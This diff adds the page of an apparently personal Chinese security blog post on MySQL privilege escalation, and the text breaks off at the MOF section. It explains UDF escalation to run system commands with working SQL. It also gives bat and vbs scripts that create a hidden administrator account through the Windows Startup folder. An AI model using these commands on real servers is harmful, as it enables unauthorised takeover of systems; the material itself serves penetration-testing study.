@@ -1,0 +1,1658 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="数据库提权, wuk0Ng">
+    <meta name="description" content="wuk0Ng的个人博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>数据库提权 | wuk0Ng</title>
+    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
+
+    <link rel="dns-prefetch" href="//hm.baidu.com">
+    <link rel="dns-prefetch" href="//zz.bdstatic.com">
+    <link rel="dns-prefetch" href="//busuanzi.ibruce.info">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css?v=20260824-speed1">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css?v=20261031-dialogue50">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+   
+<style>
+    body{
+       background-image: url(/medias/my_background.webp);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wuk0Ng</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wuk0Ng</div>
+        <div class="logo-desc">
+            
+            wuk0Ng的个人博客
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank" rel="noopener noreferrer">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank" rel="noopener noreferrer"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.webp')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">数据库提权</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                <span class="chip bg-color">红队</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-10-31
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><p><a target="_blank" rel="noopener" href="https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/mysql%E6%8F%90%E6%9D%83/#%E5%AE%9E%E6%93%8D">https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/mysql%E6%8F%90%E6%9D%83/#%E5%AE%9E%E6%93%8D</a></p>
+<p>还是大佬的博客</p>
+<p>mysql的权限提升通常可以两种：</p>
+<ul>
+<li>UDF提权（常用）</li>
+<li>写文件提权<ul>
+<li>启动项提权</li>
+<li>mof提权</li>
+</ul>
+</li>
+</ul>
+<h2 id="一、UDF提权"><a href="#一、UDF提权" class="headerlink" title="一、UDF提权"></a>一、UDF提权</h2><h4 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h4><p>全称为user defined function，用户自定义函数</p>
+<p>用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数</p>
+<h4 id="UDF提权的作用"><a href="#UDF提权的作用" class="headerlink" title="UDF提权的作用"></a>UDF提权的作用</h4><p>渗透过程中，拿下一台低权限的主机shell（尤其是windows）时，有些操作无法进行，而此时本地恰好存在mysql数据库，且mysql是root权限 (windows中mysql一般都是管理员权限)，就可以通过新建管理员用户等操作实现提权即udf提权，也可以称为通过mysql获得管理员权限</p>
+<h4 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h4><p>动态链接库：是把程序代码中会使用的函数编译成机器码，保存在.dll文件中。在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
+<p><strong>注</strong>：在linux中对应为so文件</p>
+<h4 id="利用条件以及数据库版本问题"><a href="#利用条件以及数据库版本问题" class="headerlink" title="利用条件以及数据库版本问题"></a>利用条件以及数据库版本问题</h4><p>获得一个mysql数据库账号（最好是root），拥有insert、delete权限，拥有将xxx.dll写入相对应目录的权限</p>
+<p>查看版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>查看secure-file-priv是否有目录限制，执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;secure%&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<ul>
+<li>当secure_file_priv 的值为 NULL ，表示限制mysqld 不允许导入|导出，无法进行提权</li>
+<li>当secure_file_priv 的值为 c:&#x2F; ，表示限制 mysqld 的导入|导出只能发生在c盘目录下，无法进行提权</li>
+<li>当 secure_file_priv的值没有具体值时，表示不对 mysqld 的导入|导出做限制，可以提权</li>
+</ul>
+<p>查看plugin目录是否存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@plugin_dir;</span><br><span class="line">#或</span><br><span class="line">show variables like &#x27;plugin%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL &lt; 5.0</td>
+<td>导出路径随意</td>
+</tr>
+<tr>
+<td>5.0 &lt;&#x3D; MySQL &lt; 5.1</td>
+<td>需要导出至目标服务器的系统目录（如：C:\windows\system32\）</td>
+</tr>
+<tr>
+<td>5.1 &lt; MySQL</td>
+<td>必须导出到MySQL安装目录下的<code>lib\plugin</code>目录下（高版本mysql默认不存在<code>lib\plugin</code>目录，需要自己创建）</td>
+</tr>
+</tbody></table>
+<p>版本大于5.1的时候，<code>lib\plugin</code>文件夹的创建方法：</p>
+<p>版本大于5.1的时候，<code>lib\plugin</code>文件夹的创建方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">#查找到mysql的目录</span><br><span class="line"> </span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;;</span><br><span class="line">#利用NTFS ADS创建lib目录</span><br><span class="line"> </span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;;</span><br><span class="line">#利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<h4 id="udf文件的获取与上传"><a href="#udf文件的获取与上传" class="headerlink" title="udf文件的获取与上传"></a>udf文件的获取与上传</h4><p>很多现成的udf文件，不需要自己构造：</p>
+<ul>
+<li><p>从sqlmap中获取 sqlmap中的udf文件为了防止误杀进行了异或处理，需要利用sqlmap自带的解码脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python  /usr/share/sqlmap/extra/cloak/cloak.py -d -i  /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_  -o lib_mysqludf_sys.dll</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win</span></span><br><span class="line"></span><br><span class="line">python  /usr/share/sqlmap/extra/cloak/cloak.py -d -i  /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_  -o lib_mysqludf_sys.so</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从msf中获取</p>
+<p><code>/usr/share/metasploit-framework/data/exploits/mysql</code>，直接cp出来就可以，不需要解码</p>
+<p>使用MSF中的<code>exploit/multi/mysql/mysql_udf_payload</code>模块也可以进行UDF提权,MSF会将dll写入lib\plugin\目录下(前提是目录存在,如果目录不存在,则不能成功),DLL文件可以取任意的名字,该dll文件包含sys_exec()和sys_eval()两个函数.但是默认只创建sys_exec()函数,该函数执行并不会有回显,我们可以手工创建sys_eval()函数,来执行有回显的命令</p>
+</li>
+<li><p>国光师傅的博客：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/udf/">https://www.sqlsec.com/udf/</a></p>
+</li>
+</ul>
+<p>得到udf文件后，可利用webshell上传或者hex编码上传（这里只是举例，实际上，上传的方式有很多，步骤多变，应当视情况而定）:</p>
+<ul>
+<li><p>创建一张临时表用来存放DLL&#x2F;SO文件的十六进制内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE temp_udf(udf blob);</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+</li>
+<li><p>插入</p>
+<p>转化成十六进制方法很多这里我们使用mysql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;C:/udf,dll&#x27;)) into dumpfile &#x27;c:/udf.txt&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p><strong>注</strong>：outfile导出文件会在末尾写入新行且转义换行符,破坏二进制文件结构,dumpfile不会进行任何操作</p>
+</li>
+<li><p>插入</p>
+<p>其中$binaryCode为已经转换好的十六进制内容,$binarycode前加0X</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT into temp_udf values (CONVERT($binaryCode,CHRA));</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+</li>
+<li><p>导出</p>
+<p>将udf文件导出至对应位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM temp_udf INTO DUMPFILE &quot;/usr/lib64/mysql/plugins/udf.so&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p><strong>注</strong>:此时如果出现了错误Can’t create&#x2F;write to file是因为没有lib&#x2F;plugin目录into dumpfile也不能创建文件夹所以报错</p>
+</li>
+</ul>
+<h4 id="使用udf-dll"><a href="#使用udf-dll" class="headerlink" title="使用udf.dll"></a>使用udf.dll</h4><p>udf常用函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sys_eval，执行任意命令，并将输出返回。</span><br><span class="line"></span><br><span class="line">sys_exec，执行任意命令，并将退出码返回。</span><br><span class="line"></span><br><span class="line">sys_get，获取一个环境变量。</span><br><span class="line"></span><br><span class="line">sys_set，创建或修改一个环境变量。</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>假设我的udf文件名为‘udf.dll’，且已经上传到了mysql检索目录中，接下来只需要引入即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 实例</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>只有两个变量，一个是function_name（函数名），我们想引入的函数是sys_eval。还有一个变量是shared_library_name（共享包名称），即‘xxx.dll’。</p>
+<p>可以查看是否添加成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>至此便成功引入了sys_eval函数，用于在mysql中执行系统命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>如果要卸载该函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>了解基本原理和流程后，接下来用实际操作熟悉一下具体的利用手法</p>
+<ul>
+<li><strong>vulnhub-Raven:2</strong>：具体操作见大佬的另一篇文章：<a target="_blank" rel="noopener" href="https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/vulnhub-raven2%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/">vulnhub-Raven:2 渗透记录</a></li>
+</ul>
+<h2 id="二、写文件提权"><a href="#二、写文件提权" class="headerlink" title="二、写文件提权"></a>二、写文件提权</h2><p>写文件提权针对于windows系统，基本上就是使用MySQL的outfile或dumpfile函数，向windows特定目录中写入文件来以被动的方式提权，所以这样提权的前提是<strong>secure_file_priv</strong>变量设置为空</p>
+<h3 id="1-启动项提权"><a href="#1-启动项提权" class="headerlink" title="1.启动项提权"></a>1.启动项提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>windows开机时候都会有一些开机启动的程序，用户启动项会以当前登录用户的权限运行，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的</p>
+<p>MySQL的启动项提权，原理就是通过mysql把一段bat或vbs脚本导入到系统的启动项文件夹中，如果管理员启动或者重启的服务器，那么该脚本就会被调用，并执行脚本里面的命令（创建管理员账户），实现权限提升</p>
+<h4 id="上传脚本"><a href="#上传脚本" class="headerlink" title="上传脚本"></a>上传脚本</h4><p>getshell后，查看服务器上系统盘的可读可写目录，若是启动目录 “C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup” 是可读可写的，我们就可以执行上传一个vbs或者bat的脚本：</p>
+<ul>
+<li><p>bat执行的基础命令：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">net</span> user test1 Q!w2e3r4 /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators test1 /add</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+</li>
+<li><p>vbs执行的基础命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set wshshell=createobject(&quot;wscript.shell&quot;)</span><br><span class="line">a=wshshell.run(&quot;cmd.exe /c net user ttt Q!w2e3r4 /add&quot;,0)</span><br><span class="line">b=wshshell.run(&quot;cmd.exe /c net localgroup administrators ttt /add&quot;,0)</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;) </span><br><span class="line">os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName </span><br><span class="line">Set ob=GetObject(os) &#x27;得到adsi接口,绑定 </span><br><span class="line">Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;) &#x27;属性,admin组 </span><br><span class="line">Set od=ob.Create(&quot;user&quot;,&quot;test1&quot;) &#x27;建立用户 </span><br><span class="line">od.SetPassword &quot;Q!w2e3r4&quot; &#x27;设置密码 </span><br><span class="line">od.SetInfo &#x27;保存 </span><br><span class="line">Set of=GetObject(os&amp;&quot;/test1&quot;,user) &#x27;得到用户 </span><br><span class="line">oe.add os&amp;&quot;/test1&quot; </span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+</li>
+</ul>
+<p>上面脚本作用是：</p>
+<ol>
+<li>创建一个用户名为 <code>test1</code>、密码为 <code>Q!w2e3r4</code> 的用户帐户</li>
+<li>将该用户帐户添加到本地管理员组，赋予该用户管理员权限</li>
+</ol>
+<p>值得一提的是：bat脚本在启动运行时会有明显的DOS窗口弹出来，而VBS脚本则可以完全隐藏窗口且不会有错误提示，也可以写一句完成脚本后自动删除此脚本的语句</p>
+<h4 id="写入启动项"><a href="#写入启动项" class="headerlink" title="写入启动项"></a>写入启动项</h4><p>上传后直接mysql语句写入即可：</p>
+<ul>
+<li>连接到对方MYSQL 服务器</li>
+<li>进入test数据库，这个数据库一般情况下没有表</li>
+</ul>
+<p>直接写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:/www/vbs.txt&quot;) into dumpfile &quot;C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/test.bat&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>接下来只要服务器重启，即可提权成功（通常我们会主动去重启服务器，利用远程溢出（Ms12-020）或社工手法等</p>
+<h3 id="2-MOF提权"><a href="#2-MOF提权" class="headerlink" title="2.MOF提权"></a>2.MOF提权</h3><h4 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h4><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。在windows 2003及更低版本windows中，nullevt.mof文件存储在<code>c:/windows/system32/wbem/mof/</code>目录下，windows系统每隔五秒就会以system权限执行一次该文件，去监控进程创建和死亡，执行成功会移动到该目录下的good文件夹，执行失败移动到bad文件夹</p>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>对mof文件进行利用，修改此文件，将其中一部份vbs代码替换为后门代码或添加管理员用户的命令后，使用dumpfile函数导入<code>c:/windows/system32/wbem/mof/</code>文件夹，系统再次执行该文件即可完成权限提升</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>mof提权需要在system32文件夹下写文件，条件较为严苛：</p>
+<ul>
+<li>windows 2003及以下版本</li>
+<li>mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</li>
+<li>secure_file_priv参数不为null</li>
+</ul>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>添加管理员用户的vbs脚本如下：</p>
